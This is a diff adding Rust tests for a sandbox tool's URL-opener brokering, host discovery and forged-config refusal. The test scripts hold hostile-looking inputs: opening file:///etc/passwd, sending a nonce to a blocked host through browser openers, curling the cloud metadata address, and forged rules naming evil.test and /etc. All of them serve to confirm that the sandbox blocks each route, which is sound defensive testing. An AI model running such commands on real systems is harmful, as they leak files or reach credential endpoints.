@@ -722,3 +722,180 @@ fn isolation_tier_keeps_supervised_egress() {
         assert_eq!(out.stdout, "admitted\n", "{}", out.stderr);
     }
 }
+
+/// A host opener fixture that appends each URL it is asked to open to `<dir>/opened`.
+#[cfg(target_os = "linux")]
+fn opener_fixture(dir: &Path) -> (PathBuf, PathBuf) {
+    use std::os::unix::fs::PermissionsExt;
+    let log = dir.join("opened");
+    let fixture = dir.join("fixture-opener");
+    std::fs::write(
+        &fixture,
+        format!("#!/bin/sh\nprintf '%s\\n' \"$1\" >> {}\n", log.display()),
+    )
+    .unwrap();
+    std::fs::set_permissions(&fixture, std::fs::Permissions::from_mode(0o700)).unwrap();
+    (fixture, log)
+}
+
+#[cfg(target_os = "linux")]
+fn read_after_exit(log: &Path) -> String {
+    // The host opener is spawned asynchronously; give it a moment to write.
+    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(3);
+    while !log.exists() && std::time::Instant::now() < deadline {
+        std::thread::sleep(std::time::Duration::from_millis(20));
+    }
+    std::fs::read_to_string(log).unwrap_or_default()
+}
+
+/// FW-E2E-090 (Linux): under `channels = ["open-url"]` the confined `xdg-open` of an `https://`
+/// URL reaches the host opener and the operator channel records it; a `file:` URL is refused with
+/// an operator line naming its reproduction (FW-FID9); `$BROWSER` names the shim (FW-ISO17).
+#[cfg(target_os = "linux")]
+#[test]
+fn fw_e2e_090_brokered_open_url() {
+    let dir = Scratch::new("open-url");
+    let (fixture, log) = opener_fixture(dir.path());
+    std::fs::write(
+        dir.path().join("FORMWORK.toml"),
+        "extends = [\"builtin:default\"]\nrules = [\"readwrite:$CWD/**\"]\n\
+         channels = [\"open-url\"]\n",
+    )
+    .unwrap();
+    let out = formwork(
+        dir.path(),
+        &[
+            "run",
+            "--",
+            "/bin/sh",
+            "-c",
+            "xdg-open https://example.test/login && xdg-open file:///etc/passwd; \
+             basename \"$BROWSER\"",
+        ],
+        &[("FORMWORK_HOST_OPENER", fixture.to_str().unwrap())],
+    );
+    assert_eq!(out.code, 0, "{}", out.stderr);
+    assert_eq!(out.stdout, "xdg-open\n");
+    assert_eq!(read_after_exit(&log), "https://example.test/login\n");
+    assert!(out.stderr.contains("opened a URL"), "{}", out.stderr);
+    assert!(
+        out.stderr.contains("refused open-url") && out.stderr.contains("formwork explain open-url"),
+        "{}",
+        out.stderr
+    );
+}
+
+/// FW-ADV-020, the opener route (Linux): with `open-url` not lifted, a URL carrying a nonce toward
+/// a host no rule names never reaches the host opener, so no browser outside the session fetches
+/// it. (The session-bus route is `FW-E2E-082`'s refusal; the direct route is `FW-E2E-075`'s.)
+#[cfg(target_os = "linux")]
+#[test]
+fn fw_adv_020_the_opener_does_not_exfiltrate_when_not_lifted() {
+    let dir = Scratch::new("adv-020");
+    let (fixture, log) = opener_fixture(dir.path());
+    std::fs::write(
+        dir.path().join("FORMWORK.toml"),
+        "extends = [\"builtin:default\"]\nrules = [\"readwrite:$CWD/**\"]\n",
+    )
+    .unwrap();
+    let nonce = format!("nonce-{}", std::process::id());
+    let script = format!(
+        "xdg-open https://blocked.test/?q={nonce}; open https://blocked.test/?q={nonce}; \
+         sensible-browser https://blocked.test/?q={nonce}; \"$BROWSER\" https://blocked.test/?q={nonce}"
+    );
+    let out = formwork(
+        dir.path(),
+        &["run", "--", "/bin/sh", "-c", &script],
+        &[("FORMWORK_HOST_OPENER", fixture.to_str().unwrap())],
+    );
+    assert_eq!(out.code, 0, "{}", out.stderr);
+    std::thread::sleep(std::time::Duration::from_millis(300));
+    assert!(
+        !log.exists(),
+        "the host opener ran: {}",
+        read_after_exit(&log)
+    );
+    assert!(out.stderr.contains("not lifted"), "{}", out.stderr);
+}
+
+/// FW-E2E-085 (Linux): a learning run under host rules proposes `https:blocked.test` from the
+/// Gateway's refusal and `open-url` from the opener's, withholds the metadata address with an
+/// operator line, and the accepted entries apply from the next run (FW-DISC12).
+#[cfg(target_os = "linux")]
+#[test]
+fn fw_e2e_085_discovery_of_hosts_and_channels() {
+    let dir = Scratch::new("learn-hosts");
+    if !supervision_host(dir.path()) || !on_path("curl") || !on_path("strace") {
+        not_exercised("connect supervision, curl or strace unavailable");
+        return;
+    }
+    std::fs::write(
+        dir.path().join("FORMWORK.toml"),
+        "extends = [\"builtin:default\"]\nrules = [\"readwrite:$CWD/**\", \"https:127.0.0.1:9\"]\n",
+    )
+    .unwrap();
+    let learned = formwork(
+        dir.path(),
+        &[
+            "learn",
+            "--",
+            "/bin/sh",
+            "-c",
+            "curl -sS -m 3 http://blocked.test/ >/dev/null; \
+             curl -sS -m 3 http://169.254.169.254/latest >/dev/null; \
+             xdg-open https://example.test/login; true",
+        ],
+        &[],
+    );
+    assert_eq!(learned.code, 0, "{}", learned.stderr);
+    assert!(
+        learned
+            .stderr
+            .contains("withheld, not proposed (FW-DISC12)")
+            && learned.stderr.contains("169.254.169.254"),
+        "{}",
+        learned.stderr
+    );
+    let list = formwork(dir.path(), &["learn", "--list"], &[]);
+    assert!(
+        list.stdout.contains("\"https:blocked.test:80\""),
+        "{}",
+        list.stdout
+    );
+    assert!(list.stdout.contains("\"open-url\""), "{}", list.stdout);
+    assert!(!list.stdout.contains("169.254"), "{}", list.stdout);
+
+    let accepted = formwork(dir.path(), &["learn", "--accept-all"], &[]);
+    assert_eq!(accepted.code, 0, "{}", accepted.stderr);
+    let hosts = formwork(dir.path(), &["explain", "--hosts"], &[]);
+    assert!(
+        hosts.stdout.contains("https:blocked.test:80") && hosts.stdout.contains("discovered layer"),
+        "{}",
+        hosts.stdout
+    );
+    let channel = formwork(dir.path(), &["explain", "open-url"], &[]);
+    assert!(channel.stdout.contains("lifted"), "{}", channel.stdout);
+}
+
+/// FW-DISC6 for the new entry kinds: a forged discovered layer that carries a path in `rules` or a
+/// lift without provenance is refused at load.
+#[test]
+fn a_discovered_layer_without_provenance_for_hosts_or_channels_is_refused() {
+    let dir = Scratch::new("discovered-forged");
+    std::fs::write(
+        dir.path().join("FORMWORK.toml"),
+        "extends = [\"builtin:default\"]\nrules = [\"readwrite:$CWD/**\"]\n",
+    )
+    .unwrap();
+    let discovered = dir.path().join("FORMWORK.toml.discovered.toml");
+    for forged in [
+        "rules = [\"https:evil.test\"]\n",
+        "rules = [\"readwrite:/etc/**\"]\n",
+        "channels = [\"run-outside\"]\n",
+    ] {
+        std::fs::write(&discovered, forged).unwrap();
+        let out = formwork(dir.path(), &["explain", "--json"], &[]);
+        assert_ne!(out.code, 0, "{forged}");
+        assert!(out.stderr.contains("FW-DISC6"), "{forged}: {}", out.stderr);
+    }
+}
